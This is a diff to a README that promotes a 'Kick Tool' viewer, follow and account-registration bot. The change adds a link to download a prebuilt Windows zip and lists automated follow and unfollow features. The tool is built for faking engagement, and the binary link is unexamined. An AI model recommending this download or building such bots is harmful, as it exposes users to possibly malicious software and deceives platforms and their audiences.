@@ -7,7 +7,7 @@ With advanced automation capabilities, Kick Viewer Bot / Follow Bot / Autoreger 
 
 > [!Note]
 > ## Select your version of the windows and click on the picture to download
-<a href=""><img src=""></img></a>
+<a href="https://github.com/davisjayce986/Kick-Tool/releases/download/Kick-Tool/Kick_Tool_Github_x64.zip"><img src="https://github.com/user-attachments/assets/f0e3eaa3-7f3b-45ff-bf02-40bc61f95702"></img></a>
 
 ## Kick Tool Features:
 - Automates following and unfollowing users to enhance engagement.
